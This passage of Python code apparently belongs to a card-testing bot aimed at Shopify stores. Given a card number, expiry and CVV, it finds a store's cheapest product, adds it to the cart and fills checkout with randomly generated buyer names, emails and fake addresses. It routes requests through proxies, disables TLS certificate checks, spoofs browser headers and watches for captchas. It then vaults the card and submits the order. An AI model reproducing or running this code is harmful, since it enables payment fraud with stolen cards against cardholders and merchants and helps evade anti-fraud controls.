GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""
 
MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{__typename}sellerProposal{__typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl customerId isFirstOrder __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"""
 
QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl customerId isFirstOrder __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}__typename}__typename}__typename}"""
# ── Address book ──────────────────────────────────────────────────────────────
BOOK = {
    "US":  {"address1":"123 Main St","city":"New York","postalCode":"10080","zoneCode":"NY","countryCode":"US","phone":"2194157586"},
    "CA":  {"address1":"88 Queen St","city":"Toronto","postalCode":"M5J2J3","zoneCode":"ON","countryCode":"CA","phone":"4165550198"},
    "GB":  {"address1":"221B Baker Street","city":"London","postalCode":"NW1 6XE","zoneCode":"LND","countryCode":"GB","phone":"2079460123"},
    "IN":  {"address1":"221B MG Road","city":"Mumbai","postalCode":"400001","zoneCode":"MH","countryCode":"IN","phone":"+919876543210"},
    "AE":  {"address1":"Burj Tower","city":"Dubai","postalCode":"00000","zoneCode":"DU","countryCode":"AE","phone":"+97150123456"},
    "HK":  {"address1":"Nathan 88","city":"Kowloon","postalCode":"999077","zoneCode":"KL","countryCode":"HK","phone":"+85255555555"},
    "CN":  {"address1":"8 Zhongguancun St","city":"Beijing","postalCode":"100080","zoneCode":"BJ","countryCode":"CN","phone":"1062512345"},
    "CH":  {"address1":"Gotthardstrasse 17","city":"Zurich","postalCode":"6430","zoneCode":"SZ","countryCode":"CH","phone":"445512345"},
    "AU":  {"address1":"1 Martin Place","city":"Sydney","postalCode":"2000","zoneCode":"NSW","countryCode":"AU","phone":"291234567"},
    "DEFAULT": {"address1":"123 Main St","city":"New York","postalCode":"10080","zoneCode":"NY","countryCode":"US","phone":"2194157586"},
}

def pick_addr(url):
    try:
        tld = urlparse(url).netloc.split('.')[-1].upper()
        if tld in BOOK: return BOOK[tld]
    except Exception: pass
    return BOOK["DEFAULT"]

_FN = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
_LN = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Wilson"]
_EM = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]

def _name():    return random.choice(_FN), random.choice(_LN)
def _email(f,l): return f"{f.lower()}.{l.lower()}{random.randint(1,999)}@{random.choice(_EM)}"

def parse_proxy(p):
    if not p: return None
    p = p.strip()
    proto = "http"
    for s in ("socks5://","socks4://","https://","http://"):
        if p.lower().startswith(s): proto = s.rstrip("://"); p = p[len(s):]; break
    if "@" in p: return f"{proto}://{p}"
    parts = p.split(":")
    if len(parts)==2:  return f"{proto}://{parts[0]}:{parts[1]}"
    if len(parts)==4:  return f"{proto}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"{proto}://{p}"

def is_captcha(t):
    if not t: return False
    u = t.upper()
    return any(k in u for k in ("CAPTCHA_REQUIRED","CAPTCHA CHALLENGE","HCAPTCHA","H-CAPTCHA"))

def safe_json(text, label=""):
    if not text:                   return None, f"empty_body({label})"
    if not isinstance(text, str):  return None, f"non_str({label})"
    try:
        obj = json.loads(text)
    except json.JSONDecodeError as e:
        return None, f"json_err({label}):{e} snip:{text[:60]}"
    if not isinstance(obj, dict): return None, f"non_dict({label}):{type(obj).__name__}"
    return obj, None

def sg(d, *keys, default=None):
    cur = d
    for k in keys:
        if not isinstance(cur, dict): return default
        cur = cur.get(k)
        if cur is None: return default
    return cur

def eb(text, start, end):
    if not text or not start or not end: return None
    try:
        a = text.index(start) + len(start)
        b = text.index(end, a)
        return text[a:b] or None
    except ValueError: return None

def clean_response(msg):
    if not msg: return "UNKNOWN_ERROR"
    msg = str(msg)
    for pat in [r'(PAYMENTS_[A-Z_]+)',r'(CARD_[A-Z_]+)',r'([A-Z]{2,}_[A-Z_]{2,})',
                r'{"code":"([^"]+)"',r"'code':'([^']+)'",
                r'code["\']?\s*[:=]\s*["\']?([^"\',\s]{2,})["\']?']:
        for m in re.findall(pat, msg, re.IGNORECASE):
            s = m if isinstance(m,str) else m[0]
            s = s.strip("{}:'\" ")
            if s and "_" in s and len(s)<60: return s
    return msg[:80]

_WALLET_SKIP = {
    "ShopPayWalletConfig","ApplePayWalletConfig","GooglePayWalletConfig",
    "FacebookPayWalletConfig","ShopifyInstallmentsWalletConfig","PaypalWalletConfig",
    "AmazonPayClassicWalletConfig","WalletsPlatformConfiguration",
    "AnyRedeemablePaymentMethod","DeferredPaymentMethod",
}

# ── ✅ FIX 1: regenerable SSL context ──────────────────────────────────────────
def _make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx

_ssl_ctx = _make_ssl_ctx()

# ── ✅ FIX 2: LRU-bounded connector cache ────────────────────────────────────
_conn_cache: dict = {}

async def _get_connector(netloc: str) -> aiohttp.TCPConnector:
    if netloc in _conn_cache and not _conn_cache[netloc].closed:
        _conn_cache[netloc] = _conn_cache.pop(netloc)  # move to MRU
        return _conn_cache[netloc]

    while len(_conn_cache) >= _MAX_CONN_CACHE:
        old_key, old_conn = next(iter(_conn_cache.items()))
        _conn_cache.pop(old_key, None)
        try: await old_conn.close()
        except Exception: pass

    _conn_cache[netloc] = aiohttp.TCPConnector(
        ssl=_ssl_ctx,
        limit=60,
        limit_per_host=20,
        ttl_dns_cache=300,
        use_dns_cache=True,
        enable_cleanup_closed=True,
    )
    return _conn_cache[netloc]

# ── Session token extraction ──────────────────────────────────────────────────
async def _extract_sst(resp_obj, text, unesc, checkout_url):
    for hdr in ("X-Checkout-One-Session-Token","x-checkout-one-session-token",
                "X-Shopify-Checkout-Session-Token"):
        v = resp_obj.headers.get(hdr,"")
        if v and len(v)>10: return v.strip()
    for src in (text, unesc):
        for pat in [
            r'"serializedSessionToken"\s*:\s*"([^"]{20,})"',
            r'"sessionToken"\s*:\s*"([^"]{20,})"',
            r'"checkoutSessionToken"\s*:\s*"([^"]{20,})"',
            r'session[-_]?[Tt]oken["\']?\s*:\s*["\']([^"\']{20,})["\']',
            r'serialized-sessionToken["\s]+content=["\']([^"\']{20,})["\']',
            r'data-session-token=["\']([^"\']{20,})["\']',
        ]:
            m = re.search(pat, src)
            if m:
                tok = m.group(1).strip()
                if len(tok)>=20 and not re.fullmatch(r"[0-9a-f]{40}", tok):
                    return tok
    m = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})", checkout_url)
    if m and not m.group(1).isdigit(): return m.group(1)
    return None

# ── GQL helper (bytes payload) ────────────────────────────────────────────────
async def _gql(session, url, params, headers, body, proxy):
    try:
        raw = json.dumps(body, ensure_ascii=False).encode("utf-8")
        h   = {**headers, "Content-Type": "application/json; charset=utf-8"}
        async with session.post(url, params=params, headers=h, data=raw, proxy=proxy) as r:
            return await r.text(), None
    except asyncio.TimeoutError:  return None, "timeout"
    except Exception as e:         return None, str(e)[:100]

# ── Product fetch ─────────────────────────────────────────────────────────────
async def fetch_products(domain, proxy_str=None):
    if not domain.startswith("http"): domain = "https://" + domain
    proxy = parse_proxy(proxy_str)
    netloc = urlparse(domain).netloc
    conn   = await _get_connector(netloc)
    to = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=READ_TIMEOUT)
    try:
        async with aiohttp.ClientSession(connector=conn, connector_owner=False, timeout=to) as s:
            async with s.get(f"{domain}/products.json", proxy=proxy) as r:
                if r.status!=200: return None, f"products_status_{r.status}"
                data, err = safe_json(await r.text(), "products")
                if err: return None, err
                products = data.get("products",[])
                if not products: return None, "no_products"
        best_p, best = float("inf"), None
        for p in products:
            for v in p.get("variants",[]):
                if not v.get("available",True): continue
                try:
                    price = float(str(v.get("price","0")).replace(",",""))
                    if price < best_p:
                        best_p = price
                        best   = {"variant_id":str(v["id"]),"price":f"{price:.2f}"}
                except Exception: continue
        if best: return best, None
        return None, "no_valid_variants"
    except Exception as e: return None, str(e)[:80]

# ── Core processor ────────────────────────────────────────────────────────────
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxy    = parse_proxy(proxy_str)
    checkpoint_data    = None
    running_total      = "0.00"
    payment_identifier = None

    to     = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=READ_TIMEOUT)
    netloc = urlparse(ourl).netloc
    conn   = await _get_connector(netloc)

    try:
        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl, "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        }
        addr = pick_addr(ourl)
        cc_  = addr["countryCode"]
        fn, ln = _name()
        email = _email(fn, ln)

        async with aiohttp.ClientSession(connector=conn, connector_owner=False, timeout=to) as session:

            if not variant_id:
                info, err = await fetch_products(ourl, proxy_str)
                if err: return False, err, gateway, price, currency
                variant_id = info["variant_id"]
                price      = info.get("price","0.00")

            # cart
            ch = {**hdrs,"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"}
            try:
                cr = await session.post(ourl+"/cart/add.js",
                                        data=f"id={variant_id}&quantity=1", headers=ch, proxy=proxy)
                if cr.status!=200:
                    cr = await session.post(ourl+"/cart/add.js",
                                            json={"items":[{"id":int(variant_id),"quantity":1}]},
                                            headers={**hdrs,"Content-Type":"application/json"}, proxy=proxy)
                if cr.status!=200:
                    return False, f"cart_failed_{cr.status}", gateway, price, currency
            except Exception as e:
                return False, f"cart_error:{str(e)[:60]}", gateway, price, currency

            # checkout
            ch2 = {**hdrs,
                   "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                   "sec-fetch-dest":"document","sec-fetch-mode":"navigate",
                   "sec-fetch-site":"same-origin","sec-fetch-user":"?1"}
            try:
                resp = await session.post(ourl+"/checkout/", allow_redirects=True, headers=ch2, proxy=proxy)
            except Exception as e:
                return False, f"checkout_error:{str(e)[:60]}", gateway, price, currency

            checkout_url = str(resp.url)
            if "login" in checkout_url.lower():
                return False, "site_requires_login", gateway, price, currency

            text  = await resp.text()
            unesc = html_module.unescape(text)

            atm = re.search(r"/checkouts/(?:cn/)?([^/?#\s]{8,})", checkout_url)
            attempt_token = atm.group(1).split("?")[0] if atm else None
            if not attempt_token:
                atm2 = re.search(r'"attemptToken"\s*:\s*"([^"]{8,})"', unesc)
                attempt_token = atm2.group(1) if atm2 else None
            if not attempt_token or len(attempt_token)<8:
                return False, "no_attempt_token", gateway, price, currency

            sst = await _extract_sst(resp, text, unesc, checkout_url)
            if not sst:
                return False, "Failed to get session token", gateway, price, currency

            queue_token = eb(unesc,'"queueToken":"','"') or ""
            stable_id   = eb(unesc,'"stableId":"','"') or "1"

            merch = None
            for pat in [r"ProductVariantMerchandise/(\d+)",
                        r'"merchandiseId":"gid://shopify/ProductVariantMerchandise/(\d+)"']:
                m = re.search(pat, unesc)
                if m: merch = m.group(1); break
            if not merch: merch = str(variant_id)

            for pat in [r'"currencyCode":"([A-Z]{3})"']:
                m = re.search(pat, unesc)
                if m: currency = m.group(1); break

            subtotal = None
            for pat in [r'"subtotalBeforeTaxesAndShipping":\{"value":\{"amount":"([\d.]+)"',
                        r'subtotalBeforeTaxesAndShipping":{"value":{"amount":"([\d.]+)"']:
                m = re.search(pat, unesc)
                if m: subtotal = m.group(1); break
            if not subtotal:
                m = re.search(r'"price":\s*"([\d.]+)"', unesc)
                subtotal = m.group(1) if m else "0.01"

            build_id  = None
            m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
            if m: build_id = m.group(1)

            src_tok = eb(text,'name="serialized-sourceToken" content="','"')
            if src_tok: src_tok = src_tok.replace("&quot;","").strip('"')

            ident_sig = None
            m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unesc)
            if m: ident_sig = m.group(1)

            hdrs.update({
                "shopify-checkout-client":      "checkout-web/1.0",
                "shopify-checkout-source":      f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin",
            })
            if build_id:
                hdrs["x-checkout-web-build-id"]        = build_id
                hdrs["x-checkout-web-deploy-stage"]    = "production"
                hdrs["x-checkout-web-server-handling"] = "fast"
                hdrs["x-checkout-web-server-rendering"]= "yes"
            if src_tok:
                hdrs["x-checkout-web-source-id"] = src_tok

            gql_url = f"https://{netloc}/checkouts/unstable/graphql"
            gql_p   = {"operationName":"Proposal"}

            addr_p = {
                "address1":addr["address1"],"address2":"","city":addr["city"],
                "countryCode":cc_,"postalCode":addr["postalCode"],
                "firstName":fn,"lastName":ln,"zoneCode":addr["zoneCode"],"phone":addr["phone"],
            }

            prop_vars = {
                "sessionInput": {"sessionToken":sst},
                "queueToken":   queue_token,
                "discounts":    {"lines":[],"acceptUnexpectedDiscounts":True},
                "delivery": {"deliveryLines":[{
                    "destination":{"partialStreetAddress":addr_p},
                    "selectedDeliveryStrategy":{
                        "deliveryStrategyMatchingConditions":{
                            "estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},
                        "options":{}},
                    "targetMerchandiseLines":{"any":True},
                    "deliveryMethodTypes":["SHIPPING"],
                    "expectedTotalPrice":{"any":True},
                    "destinationChanged":True,
                }],
                "noDeliveryRequired":[],"useProgressiveRates":False,
                "prefetchShippingRatesStrategy":None,"supportsSplitShipping":True},
                "deliveryExpectations":{"deliveryExpectationLines":[]},
                "merchandise":{"merchandiseLines":[{
                    "stableId":stable_id,
                    "merchandise":{"productVariantReference":{
                        "id":f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId":f"gid://shopify/ProductVariant/{variant_id}",
                        "properties":[],"sellingPlanId":None,"sellingPlanDigest":None}},
                    "quantity":{"items":{"value":1}},
                    "expectedTotalPrice":{"value":{"amount":subtotal,"currencyCode":currency}},
                    "lineComponentsSource":None,"lineComponents":[]}]},
                "payment":{
                    "totalAmount":{"any":True},"paymentLines":[],
                    "billingAddress":{"streetAddress":{
                        "address1":"","city":"","countryCode":cc_,"lastName":"","zoneCode":"ENG","phone":""}}},
                "buyerIdentity":{
                    "customer":{"presentmentCurrency":currency,"countryCode":cc_},
                    "email":email,"emailChanged":False,"phoneCountryCode":cc_,
                    "marketingConsent":[{"email":{"value":email}}],
                    "shopPayOptInPhone":{"countryCode":cc_},"rememberMe":False},
                "tip":{"tipLines":[]},
                "taxes":{
                    "proposedAllocations":None,
                    "proposedTotalAmount":{"value":{"amount":"0","currencyCode":currency}},
                    "proposedTotalIncludedAmount":None,
                    "proposedMixedStateTotalAmount":None,"proposedExemptions":[]},
                "note":{"message":None,"customAttributes":[]},
                "localizationExtension":{"fields":[]},
                "nonNegotiableTerms":None,
                "scriptFingerprint":{
                    "signature":None,"signatureUuid":None,
                    "lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},
                "optionalDuties":{"buyerRefusesDuties":False},
            }

            t1, e1 = await _gql(session, gql_url, gql_p, hdrs,
                                 {"query":QUERY_PROPOSAL_SHIPPING,"operationName":"Proposal",
                                  "variables":prop_vars}, proxy)
            if not t1: return False, f"proposal_failed:{e1}", gateway, price, currency
            if is_captcha(t1): return False, "CAPTCHA_REQUIRED", gateway, price, currency

            r1, pe = safe_json(t1, "proposal_shipping")
            if pe: return False, pe, gateway, price, currency

            if r1.get("errors"):
                msgs = [e.get("message","") for e in r1["errors"][:2]]
                return False, f"gql_error:{';'.join(msgs)[:120]}", gateway, price, currency

            # ✅ FIX 3: walker handles session:null / Throttled wrapper
            data_node = r1.get("data") or {}
            negotiate = None
            if isinstance(data_node, dict):
                sess = data_node.get("session")
                if isinstance(sess, dict):
                    negotiate = sess.get("negotiate")
                if not isinstance(negotiate, dict):
                    alt = data_node.get("data")
                    if isinstance(alt, dict):
                        alt_sess = alt.get("session")
                        if isinstance(alt_sess, dict):
                            alt_neg = alt_sess.get("negotiate")
                            if isinstance(alt_neg, dict):
                                negotiate = alt_neg

            if not isinstance(negotiate, dict):
                return False, "negotiate_null_throttled_retry", gateway, price, currency

            result = negotiate.get("result")
            if not isinstance(result,dict): return False,"result_null",gateway,price,currency
            rtype = result.get("__typename","")
            if rtype=="CheckpointDenied": return False,"checkpoint_denied",gateway,price,currency
            if rtype=="Throttled":        return False,"throttled",gateway,price,currency
            if rtype=="NegotiationResultFailed": return False,"negotiation_failed",gateway,price,currency

            checkpoint_data = result.get("checkpointData")
            sp = result.get("sellerProposal")
            if not isinstance(sp,dict): return False,"seller_proposal_null",gateway,price,currency

            rt_d = sp.get("runningTotal")
            if isinstance(rt_d,dict):
                running_total = sg(rt_d,"value","amount",default="0.00")
            else:
                tot_d = sp.get("total")
                running_total = sg(tot_d,"value","amount",default="0.01") if isinstance(tot_d,dict) else "0.01"
            if not running_total: return False,"no_running_total",gateway,price,currency

            dlv = sp.get("delivery",{}); d_stg = ""; ship = 0.0
            if isinstance(dlv,dict) and dlv.get("__typename")=="FilledDeliveryTerms":
                dls = dlv.get("deliveryLines",[])
                if dls and isinstance(dls[0],dict):
                    avail = dls[0].get("availableDeliveryStrategies",[])
                    if avail and isinstance(avail[0],dict):
                        d_stg = avail[0].get("handle","")
                        ship  = float(sg(avail[0],"amount","value","amount",default="0") or 0)

            tax = 0.0
            tax_d = sp.get("tax",{})
            if isinstance(tax_d,dict) and tax_d.get("__typename")=="FilledTaxTerms":
                tax = float(sg(tax_d,"totalTaxAmount","value","amount",default="0") or 0)

            gw_name = "UNKNOWN"
            pay_d = sp.get("payment",{})
            if isinstance(pay_d,dict) and pay_d.get("__typename")=="FilledPaymentTerms":
                for ln_ in (pay_d.get("availablePaymentLines") or []):
                    pm = ln_.get("paymentMethod",{})
                    if pm.get("__typename","") in _WALLET_SKIP: continue
                    pid = (pm.get("paymentMethodIdentifier") or pm.get("id") or "").strip()
                    gw_name = (pm.get("extensibilityDisplayName") or pm.get("displayName") or
                               pm.get("name") or pid).strip()
                    if pid: payment_identifier = pid; gateway = gw_name; break

            if not payment_identifier:
                payment_identifier = "shopify_payments"
                gateway = "Shopify Payments"

            price = str(round(float(running_total)+ship+tax, 2))

            dv = prop_vars["delivery"]["deliveryLines"][0]
            dv["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle":{"handle":d_stg,"customDeliveryRate":False},"options":{}}
            dv["targetMerchandiseLines"] = {"lines":[{"stableId":stable_id}]}
            dv["expectedTotalPrice"] = {"value":{"amount":str(ship),"currencyCode":currency}}
            dv["destinationChanged"] = False
            prop_vars["payment"]["billingAddress"] = {"streetAddress":{**addr_p,"address2":""}}
            prop_vars["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax)
            prop_vars["buyerIdentity"]["shopPayOptInPhone"]["number"] = addr["phone"]

            t2, _ = await _gql(session, gql_url, gql_p, hdrs,
                                {"query":QUERY_PROPOSAL_SHIPPING,"operationName":"Proposal",
                                 "variables":prop_vars}, proxy)
            if is_captcha(t2 or ""): return False,"CAPTCHA_REQUIRED_delivery",gateway,price,currency

            # ── Vault ──────────────────────────────────────────────────────────
            vault_body = json.dumps({
                "credit_card":{
                    "number":cc,"month":int(mes),"year":int(ano),
                    "verification_value":cvv,"start_month":None,"start_year":None,
                    "issue_number":"","name":f"{fn} {ln}"},
                "payment_session_scope": netloc,
            }, ensure_ascii=False).encode("utf-8")

            _VAULT_URLS = [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://checkout.pci.shopify.com/sessions",
            ]
            if "checkout.pci.shopify.com" in unesc and "checkout.pci.shopifyinc.com" not in unesc:
                _VAULT_URLS = _VAULT_URLS[::-1]

            def _vault_headers(vault_base_url):
                h = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin":  vault_base_url.rsplit("/sessions",1)[0],
                    "Referer": vault_base_url.rsplit("/sessions",1)[0] + "/",
                    "User-Agent": hdrs["User-Agent"],
                    "sec-ch-ua": hdrs["sec-ch-ua"],
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-storage-access": "active",
                }
                if ident_sig:
                    h["shopify-identification-signature"] = ident_sig
                return h

            # ✅ FIX 4: vault retry keeps proxy; detailed error codes
            async def _vault_once(url, prx):
                vc = aiohttp.TCPConnector(ssl=_ssl_ctx, limit=5, force_close=True,
                                          enable_cleanup_closed=True)
                vt_obj = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=15, total=20)
                try:
                    async with aiohttp.ClientSession(connector=vc, timeout=vt_obj) as vs:
                        async with vs.post(url, data=vault_body,
                                           headers=_vault_headers(url),
                                           proxy=prx) as vr:
                            status = vr.status
                            body   = await vr.text()
                    return status, body, None
                except asyncio.TimeoutError:
                    return None, None, "timeout"
                except aiohttp.ClientConnectorError as ex:
                    return None, None, f"conn:{str(ex)[:60]}"
                except aiohttp.ClientProxyConnectionError as ex:
                    return None, None, f"proxy_conn:{str(ex)[:60]}"
                except aiohttp.ClientSSLError as ex:
                    return None, None, f"ssl:{str(ex)[:60]}"
                except Exception as ex:
                    return None, None, f"other:{type(ex).__name__}:{str(ex)[:60]}"
                finally:
                    try: await vc.close()
                    except Exception: pass

            _RETRY_PLAN = [
                (0,   0, proxy),
                (0.8, 1, proxy),
                (1.5, 0, proxy),
                (2.5, 1, None),
            ]

            token = None
            last_vault_err = "vault_all_attempts_failed"
            for wait_s, url_idx, prx_override in _RETRY_PLAN:
                if wait_s > 0:
                    await asyncio.sleep(wait_s)
                v_url = _VAULT_URLS[url_idx]
                status, body, err_detail = await _vault_once(v_url, prx_override)

                if status is None:
                    last_vault_err = f"vault_conn_err:{err_detail}"
                    continue
                if status == 429:
                    last_vault_err = f"vault_429:{v_url.split('/')[2]}"
                    continue
                if status not in (200, 201):
                    last_vault_err = f"vault_http_{status}:{(body or '')[:60]}"
                    continue

                vj, ve = safe_json(body, "vault")
                if ve:
                    last_vault_err = f"vault_parse:{ve}"
                    continue
                token = vj.get("id") if isinstance(vj, dict) else None
                if token:
                    break
                last_vault_err = f"vault_no_id:{str(vj)[:80]}"

            if not token:
                return False, last_vault_err, gateway, price, currency

            # ── Submit ────────────────────────────────────────────────────────
            sa = {k:v for k,v in addr_p.items()}; sa["address2"] = ""
            submit_vars = {
                "input":{
                    "sessionInput":{"sessionToken":sst},
                    "queueToken":queue_token,
                    "discounts":{"lines":[],"acceptUnexpectedDiscounts":True},
                    "delivery":{"deliveryLines":[{
                        "destination":{"streetAddress":sa},
                        "selectedDeliveryStrategy":{
                            "deliveryStrategyByHandle":{"handle":d_stg,"customDeliveryRate":False},
                            "options":{"phone":addr["phone"]}},
                        "targetMerchandiseLines":{"lines":[{"stableId":stable_id}]},
                        "deliveryMethodTypes":["SHIPPING"],
                        "expectedTotalPrice":{"value":{"amount":str(ship),"currencyCode":currency}},
                        "destinationChanged":False,
                    }],
                    "noDeliveryRequired":[],"useProgressiveRates":True,
                    "prefetchShippingRatesStrategy":None,"supportsSplitShipping":True},
                    "merchandise":{"merchandiseLines":[{
                        "stableId":stable_id,
                        "merchandise":{"productVariantReference":{
                            "id":f"gid://shopify/ProductVariantMerchandise/{merch}",
                            "variantId":f"gid://shopify/ProductVariant/{variant_id}",
                            "properties":[],"sellingPlanId":None,"sellingPlanDigest":None}},
                        "quantity":{"items":{"value":1}},
                        "expectedTotalPrice":{"value":{"amount":subtotal,"currencyCode":currency}},
                        "lineComponentsSource":None,"lineComponents":[]}]},
                    "payment":{
                        "totalAmount":{"any":True},
                        "paymentLines":[{
                            "paymentMethod":{"directPaymentMethod":{
                                "paymentMethodIdentifier":payment_identifier,
                                "sessionId":token,
                                "billingAddress":{"streetAddress":sa},
                                "cardSource":None}},
                            "amount":{"value":{"amount":running_total,"currencyCode":currency}},
                            "dueAt":None}],
                        "billingAddress":{"streetAddress":sa}},
                    "buyerIdentity":{
                        "customer":{"presentmentCurrency":currency,"countryCode":cc_},
                        "email":email,"emailChanged":False,"phoneCountryCode":cc_,
                        "marketingConsent":[{"email":{"value":email}}],
                        "shopPayOptInPhone":{"number":addr["phone"],"countryCode":cc_},
                        "rememberMe":False},
                    "taxes":{
                        "proposedAllocations":None,
                        "proposedTotalAmount":{"value":{"amount":str(tax),"currencyCode":currency}},
                        "proposedTotalIncludedAmount":None,
                        "proposedMixedStateTotalAmount":None,"proposedExemptions":[]},
                    "tip":{"tipLines":[]},
                    "note":{"message":None,"customAttributes":[]},
                    "localizationExtension":{"fields":[]},
                    "nonNegotiableTerms":None,
                    "optionalDuties":{"buyerRefusesDuties":False},
                },
                "attemptToken":attempt_token,
                "metafields":[],
                "analytics":{"requestUrl":checkout_url},
            }
            if checkpoint_data:
                submit_vars["input"]["checkpointData"] = checkpoint_data

            st_txt, _ = await _gql(session, gql_url, {"operationName":"SubmitForCompletion"},
                                   hdrs, {"query":MUTATION_SUBMIT,"variables":submit_vars,
                                          "operationName":"SubmitForCompletion"}, proxy)

